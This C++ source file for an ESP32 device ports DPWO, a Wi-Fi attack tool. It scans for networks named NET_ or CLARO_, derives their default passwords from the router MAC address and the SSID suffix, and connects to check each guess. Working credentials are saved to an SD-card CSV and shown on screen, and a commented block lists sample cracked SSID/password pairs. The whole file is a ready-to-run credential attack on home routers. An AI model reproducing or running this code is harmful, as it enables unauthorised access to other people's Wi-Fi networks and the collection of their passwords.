/*
  Port of DPWO for ESP32 by pr3y

  Originally from https://github.com/caioluders/DPWO

  saves login creds on SD mounted card
*/
#include <WiFi.h>
#include <regex>
#include "sd_functions.h"
#define SD_CREDS_PATH "/dpwo_creds.csv"

#include "globals.h"
#include "dpwo.h"
#include "display.h"
#include "mykeyboard.h"

std::vector<std::pair<String, String>> networksSaved;
std::vector<String> networksScanned;

int ap_scanned;
int total_scanned;

int selectedItem = 0;
int itemsPerPage = 3;
int totalPages = (networksSaved.size() + itemsPerPage - 1) / itemsPerPage;

//Remove : do endereço MAC
void parse_BSSID(char* bssid_without_colon, const char* bssid) {
  int j = 0;
  for (int i = 0; i < strlen(bssid); ++i) {
    if (bssid[i] != ':') {
      bssid_without_colon[j++] = bssid[i];
    }
  }
  bssid_without_colon[j] = '\0';
}

void saveToCSV(const String &filename, const String &csvLine) {
  FS *fs;
  if(setupSdCard()) fs=&SD;
  else fs=&LittleFS;
  File file = (*fs).open(filename, FILE_APPEND);
  if (!file) {
    log_i("Error to open file");
    Serial.println("Error to open file");
    return;
  }
  file.println(csvLine);
  file.close();
  Serial.println("data saved");
  log_i("data saved");
}

void readFromCSV(const String &filename){
  FS *fs;
  if(setupSdCard()) fs=&SD;
  else fs=&LittleFS;
  File file = (*fs).open(filename);
  if (!file) {
    log_i("Error to open file");
    Serial.println("Error to open file");
    return;
  }

  while(file.available()){
    String line = file.readStringUntil('\n');
    int commaIndex = line.indexOf(',');
    if(commaIndex>=0){
      // Serial.print(line.substring(0,commaIndex)+":"+line.substring(commaIndex+1));
      String col1 = line.substring(0, commaIndex);
      String col2 = line.substring(commaIndex + 1);
      networksSaved.push_back(std::make_pair(col1, col2));
    }
  }
  file.close();
}


bool alreadyScanned(const String& wifi_ssid) {
  return find(networksScanned.begin(), networksScanned.end(), wifi_ssid) != networksScanned.end();
}

void net_ap(int i) {
  char bssid_without_colon[18];
  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssid_without_colon);
  char *bssid_ready = bssid_without_colon + 4;
  bssid_ready[strlen(bssid_ready)-2] = '\0';
  int ssid_length = WiFi.SSID(i).length();
  if (ssid_length >= 2) {
      String last_two = WiFi.SSID(i).substring(ssid_length - 2);
      strcat(bssid_ready, last_two.c_str());
  } else {
      Serial.println("ERROR");
  }
  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("\nNOPE");
    WiFi.disconnect();
    return;
  }
  Serial.println("\nWiFi Connected");
  WiFi.disconnect();
  networksScanned.push_back(WiFi.SSID(i));
  //Salvar no SD
  String csvLine = String(WiFi.SSID(i) + "," + bssid_ready);
  saveToCSV(SD_CREDS_PATH, csvLine);

  WiFi.disconnect();

  tft.setTextSize(1);
  tft.setTextColor(FGCOLOR-0x2000);
  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
}

void claro_ap(int i) {
  char bssid_without_colon[18];
  parse_BSSID(bssid_without_colon, WiFi.BSSIDstr(i).c_str());
  Serial.println("MAC addr");
  Serial.println(bssid_without_colon);
  char *bssid_ready = bssid_without_colon + 4;
  bssid_ready[strlen(bssid_ready)-2] = '\0';
  int ssid_length = WiFi.SSID(i).length();
  if (ssid_length >= 2) {
      String last_two = WiFi.SSID(i).substring(ssid_length - 2);
      strcat(bssid_ready, last_two.c_str());
  }
  Serial.println("Password:");
  Serial.println(bssid_ready);
  Serial.println("strlen:");
  Serial.println(strlen(bssid_ready));
  WiFi.begin(WiFi.SSID(i).c_str(), bssid_ready);
  delay(2000);
  while (WiFi.status() != WL_CONNECTED) {
    Serial.println("NOPE");
    WiFi.disconnect();
    return;
  }
  Serial.println("WiFi Connected");
  networksScanned.push_back(WiFi.SSID(i));
  //Salvar no SD
  String csvLine = String(WiFi.SSID(i) + "," + bssid_ready);
  saveToCSV(SD_CREDS_PATH,csvLine);
  WiFi.disconnect();

  tft.setTextSize(1);
  tft.setTextColor(FGCOLOR-0x2000);
  tft.println(String(WiFi.SSID(i) + ":" + bssid_ready).c_str());
}

void dpwoSetup(){
  ap_scanned=0;
  total_scanned=0;
  WiFi.mode(WIFI_STA);
  readFromCSV(SD_CREDS_PATH);
  for (const auto& pair : networksSaved) {
    networksScanned.push_back(pair.first);
  }
}

void dpwoRun() {
  Serial.println("Scanning for DPWO...");
  tft.setTextColor(FGCOLOR-0x2000);
  tft.setCursor(30,tft.getCursorY()+30); tft.print("Scanning...");
  ap_scanned = WiFi.scanNetworks();
  Serial.println(ap_scanned);

  //Procura por redes próximas
  if (ap_scanned <= 0) {
    // tft.println("no networks found");
    displayError("no networks found");
    delay(800);
  } else {
    //Identificar Redes Claro e Net
    std::regex net_regex("NET_.*");
    std::regex claro_regex("CLARO_.*");

    for (int i = 0; i < ap_scanned; ++i) {
      Serial.print("\n");
      Serial.println(i);
      Serial.println(WiFi.SSID(i));
      if(alreadyScanned(WiFi.SSID(i))){
        Serial.println("Already Scanned");
        continue;
      }
      if (std::regex_search(WiFi.SSID(i).c_str(), net_regex)) {
        Serial.println("NET SSID");
        net_ap(i);
      } else if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex)) {
        Serial.println("CLARO SSID");
        claro_ap(i);

      } else {
        Serial.println("Not Vuln");
      }
      networksScanned.push_back(WiFi.SSID(i));
      total_scanned++;
    }
  }

  Serial.println("scan complete");
  Serial.println("Scanned:");
  for (const auto& str : networksScanned) {
      Serial.println(str);
  }

  Serial.println("CSV:");
  for (const auto& pair : networksSaved) {
      Serial.println(pair.first+":"+pair.second);
  }
  ap_scanned = WiFi.scanNetworks();
}

void drawDPWOinfo(){
  tft.setTextSize(FM);
  tft.setCursor(30,42);tft.print("Scanned: " +  String(total_scanned));
  tft.setCursor(30,tft.getCursorY()+20);tft.print("Found: "+ String(networksSaved.size()));
}

void drawSDinfo(){
//   networksSaved = {
//     {"CLARO_2GB932E1", "E7B932E1"},
//     {"CLARO_2G9AC2FF", "3B9AC9FF"},
//     {"CLARO_2G999237", "3B999D37"},
//     {"CLARO_2G6D725F", "376D7F5F"},
//     {"CLARO_2GFF321A", "41FF301A"}
// };
  tft.fillScreen(TFT_BLACK);
  int startItem = (selectedItem / itemsPerPage) * itemsPerPage;
  for (int i = 0; i < itemsPerPage; i++) {
    int index = startItem + i;
    if (index >= networksSaved.size()) break;
    tft.setTextSize(FM);
    if (index == selectedItem) {
        tft.setTextColor(TFT_GREENYELLOW); // Destaque para o item selecionado
    } else {
        tft.setTextColor(FGCOLOR);
    }
    Serial.println(networksSaved[index].first.c_str());
    // tft.setCursor(30, (30 * i));
    // tft.printf("%s:%s", networksSaved[index].first.c_str(), networksSaved[index].second.c_str());
    tft.setCursor(30,(40*i)+10);tft.print(networksSaved[index].first.c_str());
    tft.setCursor(30,(40*i)+30);tft.print(networksSaved[index].second.c_str());
  }
}
void drawSDinfoLoop(){
  if(Keyboard.isKeyPressed(';')){
    Serial.println(selectedItem);
    if (selectedItem > 0) {
      selectedItem--;
      drawSDinfo();
    }
    delay(200);
  }

  if(Keyboard.isKeyPressed('.')){
    Serial.println(networksSaved.size());
    if (selectedItem < networksSaved.size() - 1) {
      selectedItem++;
      drawSDinfo();
    }
    delay(200);
  }
}
